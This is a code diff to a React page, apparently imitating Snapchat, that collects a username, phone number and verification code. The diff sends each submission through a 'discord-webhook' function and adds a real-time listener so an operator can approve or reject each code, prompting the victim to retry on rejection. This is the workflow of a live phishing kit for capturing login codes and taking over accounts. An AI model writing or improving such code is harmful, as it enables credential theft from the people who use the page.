@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import SnapLogo from "@/components/SnapLogo";
 import DisclaimerBox from "@/components/DisclaimerBox";
 import SnapForm from "@/components/SnapForm";
@@ -12,33 +12,70 @@ type Step = "form" | "code" | "waiting" | "success";
 const Index = () => {
   const [step, setStep] = useState<Step>("form");
   const [formData, setFormData] = useState({ username: "", phone: "" });
+  const [submissionId, setSubmissionId] = useState<string | null>(null);
   const [codeError, setCodeError] = useState("");
 
-  const sendToDiscord = async (data: { username: string; phone: string; code?: string; step: string }) => {
+  // Écouter les changements de statut en temps réel
+  useEffect(() => {
+    if (!submissionId || step !== "waiting") return;
+
+    const channel = supabase
+      .channel(`submission-${submissionId}`)
+      .on(
+        'postgres_changes',
+        {
+          event: 'UPDATE',
+          schema: 'public',
+          table: 'submissions',
+          filter: `id=eq.${submissionId}`
+        },
+        (payload) => {
+          const newStatus = payload.new.status;
+          if (newStatus === 'approved') {
+            setStep("success");
+          } else if (newStatus === 'rejected') {
+            setCodeError("Code refusé. Veuillez réessayer.");
+            setStep("code");
+          }
+        }
+      )
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, [submissionId, step]);
+
+  const handleFormSubmit = async (data: { username: string; phone: string }) => {
+    setFormData(data);
+    
+    try {
+      const { data: response } = await supabase.functions.invoke('discord-webhook', {
+        body: { ...data, step: "form" }
+      });
+      
+      if (response?.submissionId) {
+        setSubmissionId(response.submissionId);
+      }
+    } catch (error) {
+      console.error("Error sending to Discord:", error);
+    }
+    
+    setStep("code");
+  };
+
+  const handleCodeSubmit = async (code: string) => {
+    setCodeError("");
+    
     try {
       await supabase.functions.invoke('discord-webhook', {
-        body: data
+        body: { ...formData, code, step: "code", submissionId }
       });
     } catch (error) {
       console.error("Error sending to Discord:", error);
     }
-  };
-
-  const handleFormSubmit = async (data: { username: string; phone: string }) => {
-    setFormData(data);
-    setStep("code");
-    await sendToDiscord({ ...data, step: "form" });
-  };
-
-  const handleCodeSubmit = async (code: string) => {
-    console.log("Code submitted:", code, "for user:", formData);
-    await sendToDiscord({ ...formData, code, step: "code" });
-    setStep("waiting");
     
-    // Simuler l'attente de validation (en vrai ce serait via webhook Discord)
-    setTimeout(() => {
-      setStep("success");
-    }, 5000);
+    setStep("waiting");
   };
 
   return (
